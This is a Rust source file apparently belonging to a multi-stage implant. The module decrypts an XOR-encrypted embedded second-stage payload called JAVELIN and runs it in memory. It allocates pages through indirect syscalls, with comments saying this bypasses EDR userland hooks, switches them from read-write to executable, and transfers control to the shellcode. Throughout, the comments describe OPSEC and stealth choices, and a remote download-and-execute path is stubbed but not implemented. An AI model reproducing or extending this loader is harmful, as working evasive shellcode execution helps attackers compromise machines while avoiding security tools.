//! Stage trigger module - Responsible for launching Stage 2 (JAVELIN)
//!
//! **Purpose**: Decrypts and executes the JAVELIN in-memory loader
//!
//! **Why this exists as a separate module**:
//! - Clear separation between environment validation (evasion.rs) and staging (this file)
//! - Encapsulates all Stage 2 triggering logic in one place
//! - Makes it easy to switch between different staging methods (embedded vs download)

use crate::config::{ENCRYPTED_JAVELIN, JAVELIN_XOR_KEY, JAVELIN_DOWNLOAD_URL};
use std::error::Error;

/// Triggers Stage 2 (JAVELIN) execution
///
/// This function:
/// 1. Decrypts the embedded JAVELIN payload
/// 2. Allocates executable memory using indirect syscalls (dinvk)
/// 3. Transfers execution to JAVELIN
///
/// **OPSEC Notes**:
/// - JAVELIN runs entirely in memory (never touches disk)
/// - Uses RW → RX memory transition to appear less suspicious
/// - Uses indirect syscalls via dinvk to bypass EDR userland hooks
/// - XOR decryption is fast and doesn't require external libraries
///
/// # Returns
///
/// * `Ok(())` - JAVELIN triggered successfully
/// * `Err(_)` - Failed to trigger JAVELIN
pub fn trigger_javelin() -> Result<(), Box<dyn Error>> {
    crate::debug_print!("[STAGE_TRIGGER] Starting JAVELIN trigger sequence");

    // Check if we have an embedded payload
    if ENCRYPTED_JAVELIN.len() <= 1 {
        // No embedded payload - try download method if configured
        if !JAVELIN_DOWNLOAD_URL.is_empty() {
            crate::debug_print!("[STAGE_TRIGGER] No embedded payload, attempting download...");
            return download_and_execute_javelin();
        } else {
            return Err("No JAVELIN payload available (neither embedded nor download URL configured)".into());
        }
    }

    // Decrypt the embedded JAVELIN payload
    crate::debug_print!("[STAGE_TRIGGER] Decrypting JAVELIN payload ({} bytes)", ENCRYPTED_JAVELIN.len());
    let decrypted = xor_decrypt(ENCRYPTED_JAVELIN, JAVELIN_XOR_KEY);

    // Execute JAVELIN in memory
    crate::debug_print!("[STAGE_TRIGGER] Executing JAVELIN in memory");
    execute_in_memory(&decrypted)?;

    Ok(())
}

/// XOR decryption (symmetric cipher)
///
/// Same algorithm used in the builder and dropper-rust
/// This keeps crypto dependencies minimal
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Executes payload in memory using indirect syscalls via dinvk
///
/// **Memory protection transitions**:
/// 1. Allocate as RW (PAGE_READWRITE) - Less suspicious than RWX
/// 2. Copy payload to allocated memory
/// 3. Change to RX (PAGE_EXECUTE_READ) - Executable but not writable
///
/// **OPSEC Enhancement**: Uses indirect syscalls via dinvk to bypass EDR hooks
///
/// This RW → RX transition is more OPSEC-friendly than direct RWX allocation
#[cfg(target_os = "windows")]
fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
    use std::ffi::c_void;
    use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};

    unsafe {
        // Step 1: Allocate memory as RW using indirect syscall
        crate::debug_print!("[STAGE_TRIGGER] Allocating {} bytes as RW (via indirect syscall)", payload.len());
        
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size = payload.len();
        
        let status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut base_address,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04,   // PAGE_READWRITE
        );

        if status < 0 || base_address.is_null() {
            return Err("NtAllocateVirtualMemory failed".into());
        }

        // Step 2: Copy payload to allocated memory
        crate::debug_print!("[STAGE_TRIGGER] Copying payload to allocated memory");
        std::ptr::copy_nonoverlapping(payload.as_ptr(), base_address as *mut u8, payload.len());

        // Step 3: Change memory protection to RX (executable) using indirect syscall
        crate::debug_print!("[STAGE_TRIGGER] Changing memory protection to RX (via indirect syscall)");
        let mut base = base_address;
        let mut size = payload.len();
        let mut old_protect: u32 = 0;

        let status = NtProtectVirtualMemory(
            NtCurrentProcess(),
            &mut base,
            &mut size,
            0x20, // PAGE_EXECUTE_READ
            &mut old_protect,
        );

        if status < 0 {
            return Err("NtProtectVirtualMemory failed".into());
        }

        // Step 4: Execute JAVELIN
        // JAVELIN is expected to be position-independent code
        // It will handle its own execution and stage orchestration
        crate::debug_print!("[STAGE_TRIGGER] Transferring execution to JAVELIN");
        let javelin_entry: extern "C" fn() = std::mem::transmute(base_address);
        javelin_entry();

        crate::debug_print!("[STAGE_TRIGGER] JAVELIN execution completed");
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn execute_in_memory(_payload: &[u8]) -> Result<(), Box<dyn Error>> {
    Err("Memory execution not implemented for non-Windows platforms".into())
}

/// Downloads and executes JAVELIN from a remote URL
///
/// **Alternative staging method**:
/// - Useful when ESTER binary size needs to be minimal
/// - Less stealthy (generates network traffic)
/// - Requires network connectivity
///
/// **Not implemented yet** - Placeholder for future enhancement
fn download_and_execute_javelin() -> Result<(), Box<dyn Error>> {
    // TODO: Implement HTTPS download of Stage 2
    // This would use the same TLS configuration as the agent
    // For now, return an error
    Err("Download-based staging not yet implemented".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_decrypt() {
        let data = b"Hello, World!";
        let key = b"secret";
        
        // Encrypt
        let encrypted: Vec<u8> = data.iter()
            .enumerate()
            .map(|(i, &byte)| byte ^ key[i % key.len()])
            .collect();
        
        // Decrypt
        let decrypted = xor_decrypt(&encrypted, key);
        
        assert_eq!(decrypted, data.to_vec());
    }
}
